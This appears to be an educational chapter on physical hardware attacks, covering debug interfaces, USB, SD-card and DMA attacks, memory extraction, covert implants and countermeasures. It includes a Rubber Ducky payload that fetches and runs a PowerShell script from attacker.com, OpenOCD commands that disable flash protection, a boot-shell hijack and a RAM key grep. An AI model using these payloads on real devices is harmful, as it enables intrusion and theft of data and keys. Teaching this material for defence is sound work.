# Physical Access Attacks

Physical access attacks are often the first step in hardware hacking, leveraging direct interaction with the target device to bypass security measures or extract sensitive information.

## Debug and Test Interfaces

### UART/Serial Consoles

1. **Discovery Techniques**
   - Visual inspection for labeled pins (TX, RX, GND)
   - Multimeter continuity testing
   - Logic analyzer signal monitoring during boot

2. **Common Security Issues**
   - Unauthenticated root shells
   - Bootloader command access
   - Verbose boot logs with sensitive information

3. **Attack Methodology**
   - Connect to identified UART pins
   - Try common baud rates (9600, 115200)
   - Interact during boot to interrupt normal process
   - Access shell or bootloader commands

### JTAG and SWD Debugging

1. **Interface Discovery**
   - Standard pinout identification
   - JTAGulator or similar tools for automated discovery
   - Manual probing with multimeter and logic analyzer

2. **Security Implications**
   - Full system memory access
   - CPU register control
   - Breakpoint insertion
   - Security fuse status verification

3. **Example Attack: Debug Security Bypass**
   ```
   # Using OpenOCD to bypass security
   openocd -f interface/stlink.cfg -f target/stm32f1x.cfg
   # In telnet session
   > halt
   > flash protect 0 0 last off
   > flash erase_sector 0 0 last
   > flash write_image firmware_modified.bin
   ```

### Test Points and Headers

1. **Identifying Test Points**
   - PCB marking analysis (TP1, TP2, etc.)
   - Following traces from known components
   - Checking unpopulated headers

2. **Common Test Point Types**
   - Programming interfaces
   - Factory testing connections
   - In-circuit test points
   - Power measurement points

3. **Exploitation Examples**
   - Accessing hidden functions via test commands
   - Bypassing firmware verification
   - Enabling disabled features

## External Media and Interface Attacks

### USB-based Attacks

1. **BadUSB Techniques**
   - USB device firmware reprogramming
   - Device type spoofing (keyboard, storage, etc.)
   - Command injection via HID emulation

2. **USB Boot Vulnerabilities**
   - Forced recovery mode booting
   - DFU (Device Firmware Update) mode exploitation
   - Boot sequence interruption

3. **Example: USB Rubber Ducky Attack**
   ```
   # Sample Ducky Script payload
   DELAY 3000
   GUI r
   DELAY 200
   STRING cmd.exe
   ENTER
   DELAY 200
   STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
   ENTER
   ```

### SD Card and Storage Media

1. **Boot Media Manipulation**
   - Modified boot files
   - Custom initialization scripts
   - Configuration file tampering

2. **Storage-based Attacks**
   - Fake filesystem structures
   - Hidden partitions for persistence
   - File inclusion attacks

3. **Practical Example: Raspberry Pi Boot Hijacking**
   ```
   # Add to config.txt on SD card
   init=/bin/sh
   
   # Alternative: Modify cmdline.txt
   ... rw init=/bin/bash
   ```

### DMA-based Attacks

1. **Direct Memory Access Exploitation**
   - PCIe devices accessing system memory directly
   - Thunderbolt/FireWire DMA capabilities
   - Bypassing operating system security

2. **Tools and Techniques**
   - PCILeech hardware and software toolkit
   - Inception memory analysis tool
   - FPGA-based custom DMA engines

3. **Case Study: Coldboot Attack**
   - RAM contents preserved at low temperatures
   - Memory extraction after unexpected shutdown
   - Recovery of encryption keys and sensitive data

## Physical Security Bypass

### Lock and Enclosure Defeat

1. **Electronic Lock Bypass**
   - Voltage glitching
   - Timing attacks
   - Default code exploitation

2. **Mechanical Bypass Techniques**
   - Shimming
   - Impressioning
   - Bypass tools for common enclosures

3. **Case Study: Hotel Safe Vulnerabilities**
   - Master code weaknesses
   - Override mechanisms
   - Physical design flaws

### Anti-tamper Mechanism Bypass

1. **Tamper Switch Circumvention**
   - Identifying switch mechanisms
   - Defeating mechanical switches
   - Thermal camera to locate thermal sensors

2. **Tamper-evident Seal Analysis**
   - Non-destructive inspection techniques
   - Recreating tamper-evident features
   - Cold attacks on adhesive seals

3. **Case Study: Security Camera Tamper Protection**
   - Identifying blind spots in tamper detection
   - Signal manipulation to simulate normal operation
   - Bypass of motion and orientation sensors

## Memory Extraction Techniques

### External Memory Chip Reading

1. **Flash Chip Extraction Process**
   - Identifying memory chips (NAND, NOR, EEPROM)
   - Determining pinout and protocol (SPI, I2C, parallel)
   - Using appropriate adapters and programmers

2. **In-circuit Reading Techniques**
   - Test clip attachment to SOIC/WSON packages
   - Connection to exposed programming pads
   - Managing potential bus contention issues

3. **Example: SPI Flash Reading**
   ```bash
   # Using flashrom with a CH341A programmer
   flashrom -p ch341a_spi -r extracted_flash.bin
   
   # Using Bus Pirate
   flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r flash_contents.bin
   ```

### RAM Attacks

1. **Cold Boot Attack Procedure**
   - Cooling RAM with freeze spray or liquid nitrogen
   - Quick system power cycle
   - Boot to memory acquisition tool
   - RAM contents analysis

2. **SRAM Data Remanence**
   - Power glitching to preserve contents
   - Data recovery from embedded SRAM
   - Key extraction from security modules

3. **Example: RAM Imaging Tool**
   ```bash
   # Create bootable USB with memory acquisition tool
   # Boot target and run:
   sudo ./memdump -o extracted_ram.img
   
   # Analyze for encryption keys
   strings extracted_ram.img | grep -A2 -B2 "PRIVATE KEY"
   ```

### Bus Monitoring and Interception

1. **Data Bus Probing Techniques**
   - Attaching logic analyzer to data lines
   - Protocol decoding (SPI, I²C, memory bus)
   - Identifying sensitive data transfers

2. **Address Bus Analysis**
   - Mapping memory access patterns
   - Identifying security-relevant memory regions
   - Correlating with known operations

3. **Example: Logic Analyzer Setup**
   ```
   # Saleae Logic Pro configuration
   # Channels 0-7: Data bus
   # Channels 8-9: Chip select and clock
   # Trigger on chip select activation
   # Record and analyze with protocol analyzer
   ```

## Physical Implant Installation

### Board Modification Techniques

1. **Signal Interception**
   - Track cutting and rerouting
   - Test point expansion
   - Adding monitoring headers

2. **Component Addition**
   - Soldering additional components
   - Hardware backdoor installation
   - Hardware keyloggers

3. **Example: UART Interception Tap**
   ```
   # Hardware required:
   # - Small microcontroller (ATtiny85, ESP8266)
   # - Fine wire for connections
   # - Thin insulated magnet wire
   
   # Connect to TX/RX lines and program microcontroller
   # to store or forward communications
   ```

### Covert Implant Design

1. **Size and Concealment Considerations**
   - Miniaturization techniques
   - Placement to avoid visual detection
   - Thermal and RF emission management

2. **Power Sourcing Options**
   - Parasitic power from host device
   - Battery considerations
   - Low-power design techniques

3. **Communication Methods**
   - Wireless data exfiltration (BLE, WiFi, cellular)
   - Covert channels for command and control
   - Storage-based data extraction

## Security Measures and Countermeasures

### Physical Security Controls

1. **Effective Enclosure Design**
   - Tamper-evident features
   - Security screws and custom fasteners
   - Compound enclosures requiring destruction to open

2. **Board-level Protection**
   - Conformal coating
   - Epoxy potting of sensitive components
   - Mesh sensors for tamper detection

3. **Active Anti-tamper Systems**
   - Environmental monitoring (temperature, light, pressure)
   - Motion and orientation detection
   - Secure memory erasure on tamper detection

### Interface Security

1. **Debug Interface Protection**
   - Disabling interfaces in production
   - Authentication requirements
   - Physical removal or isolation

2. **Secure Boot Implementation**
   - Root of trust establishment
   - Signature verification
   - Prevention of downgrade attacks

3. **External Media Controls**
   - Interface lockdown
   - Media authentication
   - Boot path verification

## Conclusion

Physical access attacks are foundational to hardware security assessment. While they require direct access to the target device, they often provide the deepest level of system access and can bypass software protections entirely. Understanding these attack vectors helps security professionals identify and mitigate hardware vulnerabilities effectively.

In the next section, we'll explore [Side-Channel Attacks](./07b-side-channel.md), which allow extracting information by observing the physical characteristics of a system during operation.

---

## Navigation

**Section: Attack Vectors**

* Previous: [README](../../README.md)
* Next: [Side Channel](02-side-channel.md)
* [Back to Main Index](../../README.md)
